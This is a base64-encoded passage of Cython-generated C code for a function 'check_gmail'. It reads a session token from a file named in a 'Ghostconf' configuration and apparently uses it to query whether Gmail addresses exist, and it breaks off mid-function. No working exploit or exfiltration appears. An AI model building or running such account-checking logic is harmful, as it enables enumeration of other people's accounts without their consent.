ICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfOGNoZWNrX2dtYWlsKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdG9rZW5fZGF0YSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdGwgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hvc3QgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2Nvb2tpZXMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3BhcmFtcyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZGF0YSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2Z1bGxfZW1haWwgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2UgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIGludCBfX3B5eF90XzQ7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfNzsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEyID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE1ID0gTlVMTDsKICBpbnQgX19weXhfdF8xNjsKICBQeU9iamVjdCAqKCpfX3B5eF90XzE3KShQeU9iamVjdCAqKTsKICBQeU9iamVjdCAqX19weXhfdF8xOFs1XTsKICBpbnQgX19weXhfdF8xOTsKICBQeU9iamVjdCAqX19weXhfdF8yMCA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMjE7CiAgY2hhciBjb25zdCAqX19weXhfdF8yMjsKICBQeU9iamVjdCAqX19weXhfdF8yMyA9IE5VTEw7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiY2hlY2tfZ21haWwiLCAwKTsKICBfX1B5eF9JTkNSRUYoX19weXhfdl9lbWFpbCk7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IChfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTQsIF9fcHl4X3ZfZW1haWwsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF80IDwgMCkpKSBfX1BZWF9FUlIoMCwgMTc5LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKF9fcHl4X3RfNCkgewoKICAgICAgICAKICAgICAgICBfX3B5eF90XzYgPSBfX3B5eF92X2VtYWlsOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTR9OwogICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE4MCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICB9CiAgICAgICAgX19weXhfdF82ID0gX19QeXhfR2V0SXRlbUludChfX3B5eF90XzUsIDAsIGxvbmcsIDEsIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcsIDAsIDAsIDEsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxODAsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9lbWFpbCwgX19weXhfdF82KTsKICAgICAgICBfX3B5eF90XzYgPSAwOwoKICAgICAgICAKICAgICAgfQoKICAgICAgCiAgICAgICB7CiAgICAgICAgX19weXhfdF81ID0gTlVMTDsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9vcGVuKTsKICAgICAgICBfX3B5eF90XzggPSBfX3B5eF9idWlsdGluX29wZW47IAogICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMTgxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Rva2VuX2ZpbGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTgxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgX19weXhfdF83ID0gMTsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF81LCBfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfcn07CiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzgsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDMtX19weXhfdF83KSB8IChfX3B5eF90XzcqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxODEsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgfQogICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTgxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgX19weXhfdF8xMCA9IE5VTEw7CiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE4MSwgX19weXhfTDEwX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgIF9fcHl4X3RfNyA9IDE7CiAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICAgIGlmIChsaWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgICAgICAgIF9fcHl4X3RfMTAgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTApOwogICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgICAgfQogICAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBOVUxMfTsKICAgICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMS1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxODEsIF9fcHl4X0wxMF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICAgIH0KICAgICAgICBfX3B5eF90XzUgPSBfX3B5eF90Xzg7CiAgICAgICAgX19weXhfdF84ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgewogICAgICAgICAgewogICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xMiwgJl9fcHl4X3RfMTMsICZfX3B5eF90XzE0KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEzKTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgIHsKICAgICAgICAgICAgICBfX3B5eF92X2YgPSBfX3B5eF90XzU7CiAgICAgICAgICAgICAgX19weXhfdF81ID0gMDsKCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fcHl4X3ZfZjsKICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICAgICAgX19weXhfdF83ID0gMDsKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgTlVMTH07CiAgICAgICAgICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVhZCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMS1fX3B5eF90XzcpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE4MiwgX19weXhfTDE0X2Vycm9yKQogICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3RfODsKICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICBfX3B5eF90XzcgPSAwOwogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIE5VTEx9OwogICAgICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0bGluZXMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDEtX19weXhfdF83KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxODIsIF9fcHl4X0wxNF9lcnJvcikKICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9HZXRJdGVtSW50KF9fcHl4X3RfNSwgMCwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMCwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE4MiwgX19weXhfTDE0X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICAgIF9fcHl4X3ZfdG9rZW5fZGF0YSA9IF9fcHl4X3RfODsKICAgICAgICAgICAgICBfX3B5eF90XzggPSAwOwoKICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICBnb3RvIF9fcHl4X0wxOV90cnlfZW5kOwogICAgICAgICAgICBfX3B5eF9MMTRfZXJyb3I6OwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgICAgICAgewogICAgICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiYXcuY2hlY2tfZ21haWwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzgsICZfX3B5eF90XzUsICZfX3B5eF90XzYpIDwgMCkgX19QWVhfRVJSKDAsIDE4MSwgX19weXhfTDE2X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICBfX3B5eF90XzEwID0gUHlUdXBsZV9QYWNrKDMsIF9fcHl4X3RfOCwgX19weXhfdF81LCBfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTgxLCBfX3B5eF9MMTZfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICAgICAgICBfX3B5eF90XzE1ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzExLCBfX3B5eF90XzEwLCBOVUxMKTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE1KSkgX19QWVhfRVJSKDAsIDE4MSwgX19weXhfTDE2X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMTUpOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfNCA8ICgwKSkgX19QWVhfRVJSKDAsIDE4MSwgX19weXhfTDE2X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICBfX3B5eF90XzE2ID0gKCFfX3B5eF90XzQpOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzE2KSkgewogICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzgpOwogICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUoX19weXhfdF84LCBfX3B5eF90XzUsIF9fcHl4X3RfNik7CiAgICAgICAgICAgICAgICBfX3B5eF90XzggPSAwOyAgX19weXhfdF81ID0gMDsgIF9fcHl4X3RfNiA9IDA7IAogICAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDE4MSwgX19weXhfTDE2X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgICAgZ290byBfX3B5eF9MMTVfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19weXhfTDE2X2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTIpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEzKTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTIsIF9fcHl4X3RfMTMsIF9fcHl4X3RfMTQpOwogICAgICAgICAgICBnb3RvIF9fcHl4X0wzX2Vycm9yOwogICAgICAgICAgICBfX3B5eF9MMTVfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEyKTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMyk7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEyLCBfX3B5eF90XzEzLCBfX3B5eF90XzE0KTsKICAgICAgICAgICAgX19weXhfTDE5X3RyeV9lbmQ6OwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAgewogICAgICAgICAgewogICAgICAgICAgICBpZiAoX19weXhfdF8xMSkgewogICAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdLCBOVUxMKTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAxODEsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGdvdG8gX19weXhfTDEzOwogICAgICAgICAgfQogICAgICAgICAgX19weXhfTDEzOjsKICAgICAgICB9CiAgICAgICAgZ290byBfX3B5eF9MMjM7CiAgICAgICAgX19weXhfTDEwX2Vycm9yOjsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDNfZXJyb3I7CiAgICAgICAgX19weXhfTDIzOjsKICAgICAgfQoKICAgICAgCiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdl90b2tlbl9kYXRhKSkgeyBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKCJ0b2tlbl9kYXRhIik7IF9fUFlYX0VSUigwLCAxODMsIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3ZfdG9rZW5fZGF0YTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMn07CiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTgzLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgfQogICAgICBpZiAoKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfdF82KSkpIHx8IChQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzYpKSkgewogICAgICAgIFB5T2JqZWN0KiBzZXF1ZW5jZSA9IF9fcHl4X3RfNjsKICAgICAgICBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeVNlcXVlbmNlX1NJWkUoc2VxdWVuY2UpOwogICAgICAgIGlmICh1bmxpa2VseShzaXplICE9IDIpKSB7CiAgICAgICAgICBpZiAoc2l6ZSA+IDIpIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKDIpOwogICAgICAgICAgZWxzZSBpZiAoc2l6ZSA+PSAwKSBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3Ioc2l6ZSk7CiAgICAgICAgICBfX1BZWF9FUlIoMCwgMTgzLCBfX3B5eF9MM19lcnJvcikKICAgICAgICB9CiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgaWYgKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3Qoc2VxdWVuY2UpKSkgewogICAgICAgICAgX19weXhfdF81ID0gUHlUdXBsZV9HRVRfSVRFTShzZXF1ZW5jZSwgMCk7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTsKICAgICAgICAgIF9fcHl4X3RfOCA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDEpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKHNlcXVlbmNlLCAwKTsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE4MywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMSk7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxODMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgICAgIH0KICAgICAgICAjZWxzZQogICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE4MywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHNlcXVlbm